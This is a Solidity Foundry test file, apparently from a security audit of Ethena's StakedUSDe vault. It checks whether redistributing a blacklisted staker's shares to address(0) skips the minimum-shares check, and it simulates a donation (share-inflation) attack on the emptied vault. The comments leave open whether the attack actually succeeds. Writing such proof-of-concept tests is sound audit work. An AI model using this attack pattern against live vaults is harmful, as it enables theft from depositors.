// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {StakedUSDe} from "ethena/StakedUSDe.sol";
import {USDe} from "ethena/USDe.sol";
import {IUSDe} from "ethena/interfaces/IUSDe.sol";

contract StakedUSDeRedistributeInflationTest is Test {
    USDe public usde;
    StakedUSDe public stakedUSDe;
    
    address owner = makeAddr("owner");
    address rewarder = makeAddr("rewarder");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    
    bytes32 FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
    bytes32 REWARDER_ROLE = keccak256("REWARDER_ROLE");
    
    function setUp() public {
        usde = new USDe(address(this));
        usde.setMinter(address(this));
        
        vm.startPrank(owner);
        stakedUSDe = new StakedUSDe(IUSDe(address(usde)), rewarder, owner);
        vm.stopPrank();
        
        // Fund alice and bob
        usde.mint(alice, 1000 ether);
        usde.mint(bob, 1000 ether);
        
        // Alice deposits normally
        vm.startPrank(alice);
        usde.approve(address(stakedUSDe), 1000 ether);
        stakedUSDe.deposit(1000 ether, alice);
        vm.stopPrank();
    }
    
    function testRedistributeToZeroBypassesMinSharesCheck() public {
        // Bob deposits minimum shares amount (1 ether)
        vm.startPrank(bob);
        usde.approve(address(stakedUSDe), 1 ether);
        stakedUSDe.deposit(1 ether, bob);
        vm.stopPrank();
        
        assertEq(stakedUSDe.totalSupply(), 1001 ether);
        
        // Owner blacklists bob and redistributes to address(0)
        // This burns bob's shares WITHOUT calling _checkMinShares
        // because redistributeLockedAmount uses _burn directly
        vm.startPrank(owner);
        stakedUSDe.grantRole(FULL_RESTRICTED_STAKER_ROLE, bob);
        stakedUSDe.redistributeLockedAmount(bob, address(0));
        vm.stopPrank();
        
        // Total supply is now 1000 ether (above MIN_SHARES)
        // But what if alice had only deposited 1.5 ether?
        // Let's check the actual vulnerability: 
        // Can we get totalSupply < MIN_SHARES after redistribute?
        
        emit log_named_uint("Total Supply After", stakedUSDe.totalSupply());
        emit log_named_uint("MIN_SHARES", 1 ether);
        
        // The real attack: deposit exactly MIN_SHARES, then get redistributed to 0
        // But that requires being blacklisted which needs admin
        // However, the MISSING CHECK means admin can accidentally break the vault
        // or a compromised admin key can weaponize this
        
        assertTrue(stakedUSDe.totalSupply() >= 1 ether, "Supply still above min in this scenario");
    }
    
    function testRedistributeSkipsMinShares_AllowsSubMinSupply() public {
        // Fresh setup: only bob with exactly MIN_SHARES
        // Reset by deploying new contract
        USDe usde2 = new USDe(address(this));
        usde2.setMinter(address(this));
        
        vm.startPrank(owner);
        StakedUSDe vault2 = new StakedUSDe(IUSDe(address(usde2)), rewarder, owner);
        vm.stopPrank();
        
        // Bob deposits exactly MIN_SHARES (1 ether)
        usde2.mint(bob, 1 ether);
        vm.startPrank(bob);
        usde2.approve(address(vault2), 1 ether);
        vault2.deposit(1 ether, bob);
        vm.stopPrank();
        
        assertEq(vault2.totalSupply(), 1 ether);
        
        // Blacklist bob and redistribute to address(0)
        vm.startPrank(owner);
        vault2.grantRole(FULL_RESTRICTED_STAKER_ROLE, bob);
        vault2.redistributeLockedAmount(bob, address(0));
        vm.stopPrank();
        
        // CRITICAL: totalSupply is now 0, but no MinSharesViolation reverted!
        // If someone else now donates USDe directly to the contract,
        // the next depositor gets inflated shares (classic donation attack)
        // because _checkMinShares was never called on the burn path
        
        uint256 supplyAfter = vault2.totalSupply();
        emit log_named_uint("Supply after redistribute to zero", supplyAfter);
        
        // Simulate donation attack
        usde2.mint(address(vault2), 1000 ether); // Direct transfer (donation)
        
        // New user charlie deposits 1 wei
        address charlie = makeAddr("charlie");
        usde2.mint(charlie, 1 ether);
        vm.startPrank(charlie);
        usde2.approve(address(vault2), 1 ether);
        
        // Preview should show massive share inflation
        uint256 sharesPreview = vault2.previewDeposit(1 ether);
        emit log_named_uint("Charlie would receive shares for 1 USDe", sharesPreview);
        
        // With 1000 donated + 0 supply, first depositor gets all donated assets
        // But MIN_SHARES check should prevent this... EXCEPT it wasn't called
        // Actually deposit WILL call _checkMinShares at the END of _deposit
        // So let's verify: does deposit revert or succeed?
        
        try vault2.deposit(1 ether, charlie) {
            emit log_named_string("Result", "DEPOSIT_SUCCEEDED_INFLATION_POSSIBLE");
            uint256 charlieShares = vault2.balanceOf(charlie);
            uint256 charlieAssets = vault2.previewRedeem(charlieShares);
            emit log_named_uint("Charlie redeemable assets", charlieAssets);
            // If charlieAssets >> 1 ether, inflation worked
        } catch Error(string memory reason) {
            emit log_named_string("Revert reason", reason);
            emit log_named_string("Result", "MIN_SHARES_CHECK_ON_DEPOSIT_PREVENTED_ATTACK");
        }
    }
}
